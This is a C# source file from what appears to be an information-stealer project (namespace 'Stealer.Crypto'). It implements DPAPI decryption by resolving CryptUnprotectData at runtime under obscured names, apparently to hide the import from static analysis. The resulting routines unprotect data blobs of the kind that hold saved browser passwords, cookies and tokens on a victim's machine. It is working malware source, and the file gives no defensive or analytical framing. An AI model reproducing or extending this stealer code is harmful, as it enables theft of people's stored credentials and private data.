using System;
using System.Runtime.InteropServices;
using Stealer.Utils;

namespace Stealer.Crypto
{
    public static class DpApi
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
        private delegate bool CUDDelegate(
            ref DATA_BLOB pDataIn,
            IntPtr ppszDataDescr,
            IntPtr pOptionalEntropy,
            IntPtr pvReserved,
            IntPtr pPromptStruct,
            uint dwFlags,
            ref DATA_BLOB pDataOut);

        private static CUDDelegate _cud;
        private static CUDDelegate GetCUD()
        {
            if (_cud == null)
                _cud = NativeLoader.Resolve<CUDDelegate>(NativeLoader.Lib_C32, NativeLoader.Fn_CUD);
            return _cud;
        }

        public static byte[] Decrypt(byte[] encryptedData)
        {
            if (encryptedData == null || encryptedData.Length == 0)
                return null;

            var fn = GetCUD();
            if (fn == null) return null;

            DATA_BLOB dataIn = new DATA_BLOB();
            DATA_BLOB dataOut = new DATA_BLOB();
            IntPtr pDataIn = IntPtr.Zero;

            try
            {
                pDataIn = Marshal.AllocHGlobal(encryptedData.Length);
                Marshal.Copy(encryptedData, 0, pDataIn, encryptedData.Length);

                dataIn.pbData = pDataIn;
                dataIn.cbData = encryptedData.Length;

                if (fn(ref dataIn, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref dataOut))
                {
                    byte[] decryptedData = new byte[dataOut.cbData];
                    Marshal.Copy(dataOut.pbData, decryptedData, 0, dataOut.cbData);
                    Marshal.FreeHGlobal(dataOut.pbData);
                    return decryptedData;
                }
                return null;
            }
            catch
            {
                return null;
            }
            finally
            {
                if (pDataIn != IntPtr.Zero)
                    Marshal.FreeHGlobal(pDataIn);
            }
        }

        public static byte[] Decrypt(byte[] encryptedData, byte[] entropy)
        {
            if (encryptedData == null || encryptedData.Length == 0)
                return null;

            var fn = GetCUD();
            if (fn == null) return null;

            DATA_BLOB dataIn = new DATA_BLOB();
            DATA_BLOB dataOut = new DATA_BLOB();
            DATA_BLOB entropyBlob = new DATA_BLOB();
            IntPtr pDataIn = IntPtr.Zero;
            IntPtr pEntropy = IntPtr.Zero;

            try
            {
                pDataIn = Marshal.AllocHGlobal(encryptedData.Length);
                Marshal.Copy(encryptedData, 0, pDataIn, encryptedData.Length);

                dataIn.pbData = pDataIn;
                dataIn.cbData = encryptedData.Length;

                IntPtr pEntropyPtr = IntPtr.Zero;
                if (entropy != null && entropy.Length > 0)
                {
                    pEntropy = Marshal.AllocHGlobal(entropy.Length);
                    Marshal.Copy(entropy, 0, pEntropy, entropy.Length);
                    entropyBlob.pbData = pEntropy;
                    entropyBlob.cbData = entropy.Length;
                    pEntropyPtr = Marshal.AllocHGlobal(Marshal.SizeOf(entropyBlob));
                    Marshal.StructureToPtr(entropyBlob, pEntropyPtr, false);
                }

                if (fn(ref dataIn, IntPtr.Zero, pEntropyPtr, IntPtr.Zero, IntPtr.Zero, 1, ref dataOut))
                {
                    byte[] decryptedData = new byte[dataOut.cbData];
                    Marshal.Copy(dataOut.pbData, decryptedData, 0, dataOut.cbData);
                    Marshal.FreeHGlobal(dataOut.pbData);
                    return decryptedData;
                }
                return null;
            }
            catch
            {
                return null;
            }
            finally
            {
                if (pDataIn != IntPtr.Zero)
                    Marshal.FreeHGlobal(pDataIn);
                if (pEntropy != IntPtr.Zero)
                    Marshal.FreeHGlobal(pEntropy);
            }
        }
    }
}
